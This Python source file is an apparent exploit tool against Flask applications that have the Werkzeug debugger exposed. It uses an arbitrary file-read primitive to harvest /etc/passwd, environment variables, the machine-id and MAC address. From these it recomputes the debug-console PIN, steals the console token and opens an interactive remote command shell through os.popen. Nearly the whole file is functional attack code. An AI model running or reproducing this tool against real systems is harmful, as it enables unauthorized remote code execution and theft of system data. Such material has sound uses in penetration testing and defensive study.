import requests
from urllib.parse import urlsplit
import re
import hashlib
from itertools import chain
from bs4 import BeautifulSoup as bs

def error(message="", prefix=""):
    print(f"{prefix}[ERROR] {message}")
    exit(1)

def info(message="", prefix=""):
    print(f"{prefix}[INFO] {message}")

class WConsoleExtractor:
    etc_passwd_regex = re.compile(r"(.+):.*:.*:.*:.*:.*:.*")
    modname = "flask.app"
    class_name = "Flask"

    def __init__(self, target:str, leak_function) -> None:
        self.target = target
        if not callable(leak_function):
            error("Your leak function is not callable")

        self.leak_function = leak_function

        # Get base url
        splitted = urlsplit(self.target)
        self.base_url = f"{splitted.scheme}://{splitted.netloc}"
        self.hostname = splitted.hostname

        # Initialize session
        self.sess = requests.Session()

        # Check website is up
        if not self.ping():
            error(f"{self.base_url} does not seem to be up, interrupting...")

        # Check Werkzeug
        server = self.check_werkzeug()
        if not server:
            error(f"Werkzeug not detected in {self.base_url}")

        # Check debug mode activated
        debug_mode, content = self.check_debug_mode()
        if not debug_mode:
            error(f"{self.base_url} does not seem to be in debug mode, interrupting...")
        
        # Check leak file function
        etc_passwd = self.leak_function("/etc/passwd")
        if not etc_passwd or not self.etc_passwd_regex.match(etc_passwd):
            error(f"Your leak function does not seem to work, here is the output when attempting to read /etc/passwd:\n{etc_passwd}")

        e = self.leak_function("/proc/self/environ")
        environ = WConsoleExtractor.parse_environ(e)
        self.username = self.get_username(environ)

        if not self.username:
            info("Unable to find username")
            self.username = self.choose_username(etc_passwd)

        self.python_version = self.get_python_version(server)
        self.flask_path = self.get_flask_path(WConsoleExtractor.get_venv(environ))

        if not self.flask_path:
            error("Unable to find flask package name")
        
        self.probably_public_bits = [
            self.username, 
            self.modname,
            self.class_name,
            self.flask_path
        ]
        
        # Private bits
        self.machine_id = self.get_machine_id()
        self.uuidnode = self.get_uuid_node()

        self.private_bits = [
            self.uuidnode,
            self.machine_id
        ]

        self.pin_code = WConsoleExtractor.compute_pin(self.probably_public_bits, self.private_bits)
        self.token = self.get_token(content)

    @staticmethod
    def parse_environ(environ:str):
        l = environ.split("\0")[:-1]
        env = {}
        for v in l:
            matches = re.findall(r"(.+)=(.*)", v)
            if len(matches) == 0:
                error("Error while parsing environ")
            env[matches[0][0]] = matches[0][1]
        return env

    @staticmethod
    def get_venv(environ:dict) -> bool:
        return environ.get("VIRTUAL_ENV")
            
    
    def get(self, path:str):
        return self.sess.get(f"{self.base_url}{path}")
    
    def get_headers(self):
        return self.get("/").headers
    
    def ping(self):
        try:
            r = self.get("/")
            return r.status_code
        except:
            return 0
        
    def check_debug_mode(self):
        r = self.get("/console")
        return r.status_code == 200, r.text
    
    def check_werkzeug(self):
        headers = self.get_headers()
        return headers.get("Server")
    
    def input(self):
        return input()
    
    def print(self, message=""):
        print(message, end="")
    
    # Leaks
    def choose_username(self, etc_passwd:str):
        usernames = []
        for line in etc_passwd.splitlines():
            username = self.etc_passwd_regex.findall(line)[0]
            self.print(f"{len(usernames)} : {username}\n")
            usernames.append(username)

        answer = -1
        while answer < 0 or answer > len(usernames):
            try:
                answer = int(input("Choose the number corresponding to the user that (probably) launched the app > "))
            except ValueError:
                pass

        return usernames[answer]

    def get_username(self, environ:dict) -> str:
        for k, v in environ.items():
            if k == "USERNAME" or k == "USER" or k == "LOGNAME":
                return v
            
            # HOME variable -> parse home dirname
            if k == "HOME":
                if v.startswith("/home/"):
                    return v[6:]
                else:
                    return v[1:]
        
        return ""
    
    def get_python_version(self, server):
        python_version = re.findall(r"Python\/(\d\.\d+)\..*", server)
        if len(python_version) == 0:
            error("Python version not found")
        return python_version[0].strip()

    def get_flask_path(self, venv:str) -> str:
        base_version = self.python_version.rsplit(".", 1)[0]
        if venv:
            potential_paths = [
                # pythonX.X
                f"{venv}/lib/python{self.python_version}/site-packages/flask/app.py",
                f"{venv}/lib/python{self.python_version}/dist-packages/flask/app.py",

                # pythonX
                f"/proc/self/cwd/env/lib/python{base_version}/site-packages/flask/app.py",
                f"/proc/self/cwd/env/lib/python{base_version}/dist-packages/flask/app.py",
            ]
        else:
            home_dir = f"/home/{self.username}" if self.username != "root" else "/root/"

            potential_paths = [
                # lib
                ## pythonX.X
                f"/usr/local/lib/python{self.python_version}/site-packages/flask/app.py",
                f"/usr/local/lib/python{self.python_version}/dist-packages/flask/app.py",
                f"/usr/lib/python{self.python_version}/site-packages/flask/app.py",
                f"/usr/lib/python{self.python_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib/python{self.python_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib/python{self.python_version}/site-packages/flask/app.py",

                ## pythonX
                f"/usr/local/lib/python{base_version}/site-packages/flask/app.py",
                f"/usr/local/lib/python{base_version}/dist-packages/flask/app.py",
                f"/usr/lib/python{base_version}/site-packages/flask/app.py",
                f"/usr/lib/python{base_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib/python{base_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib/python{base_version}/site-packages/flask/app.py",

                # lib64
                ## pythonX.X
                f"/usr/local/lib64/python{self.python_version}/site-packages/flask/app.py",
                f"/usr/local/lib64/python{self.python_version}/dist-packages/flask/app.py",
                f"/usr/lib64/python{self.python_version}/site-packages/flask/app.py",
                f"/usr/lib64/python{self.python_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib64/python{self.python_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib64/python{self.python_version}/site-packages/flask/app.py"

                ## pythonX
                f"/usr/local/lib64/python{base_version}/site-packages/flask/app.py",
                f"/usr/local/lib64/python{base_version}/dist-packages/flask/app.py",
                f"/usr/lib64/python{base_version}/site-packages/flask/app.py",
                f"/usr/lib64/python{base_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib64/python{base_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib64/python{base_version}/site-packages/flask/app.py",
            ]

        for path in potential_paths:
            r = self.leak_function(path)
            if r != "":
                return path
            
        return ""
    
    def get_machine_id(self):
        value = ""
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id": 
            content = self.leak_function(filename)
            matched = re.findall(r"[0-9a-f\-]+", content)

            if len(matched) > 0:
                value = matched[0]
            
        try:
            content2 = self.leak_function("/proc/self/cgroup")
            value += content2.splitlines()[0].strip().rpartition("/")[2]
        except IndexError:
            pass

        return value
    
    def get_uuid_node(self):
        net_arp = self.leak_function("/proc/net/arp")
        device_line = net_arp.splitlines()[1]
        device_id = device_line.split(" ")[-1]

        mac = self.leak_function(f"/sys/class/net/{device_id}/address")

        matched = re.findall(r"[0-9a-f:]+", mac)

        if len(matched) > 0:
            uuid_node = str(int(matched[0].replace(":", ""), base=16))

        return uuid_node
    
    def compute_pin(probably_public_bits, private_bits):
        # h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
        h = hashlib.sha1()
        for bit in chain(probably_public_bits, private_bits):
            if not bit:
                continue
            if isinstance(bit, str):
                bit = bit.encode('utf-8')
            h.update(bit)
        h.update(b'cookiesalt')
        #h.update(b'shittysalt')

        cookie_name = '__wzd' + h.hexdigest()[:20]

        num = None
        if num is None:
            h.update(b'pinsalt')
            num = ('%09d' % int(h.hexdigest(), 16))[:9]

        rv =None
        if rv is None:
            for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                    rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                  for x in range(0, len(num), group_size))
                    break
            else:
                rv = num

        return rv
    
    def get_token(self, token_request_content):
        token = re.findall(r'SECRET = "(.+)";', token_request_content)

        if len(token) == 0:
            error("Error while finding token")

        return token[0]

    def exec_cmd(self, cmd):
        authent_path = f"/console?__debugger__=yes&cmd=pinauth&pin={self.pin_code}&s={self.token}"
        self.get(authent_path)

        url = f"/console?__debugger__=yes&cmd=__import__('os').popen('{cmd}').read()&frm=0&s={self.token}"
        res = self.get(url)

        if res.status_code == 404:
            error("Error while sending command, please report the issue on tool's repository")
            return
        
        soup = bs(res.text, 'html.parser')
        span = soup.find("span")
        if span:
            output = span.contents[0].replace("'", "").replace("\\n", "\n")
        else:
            output = "This command returned no output"

        return output.strip()
    
    def shell(self):
        exit_commands = ["exit", "quit", "q"]
        cmd = ""

        while cmd not in exit_commands:
            try:
                self.print(f"[SHELL] > ")
                cmd = self.input()
            except KeyboardInterrupt:
                break

            self.print(f"{self.exec_cmd(cmd)}\n")
        
        info("Shell terminated", prefix="\n")
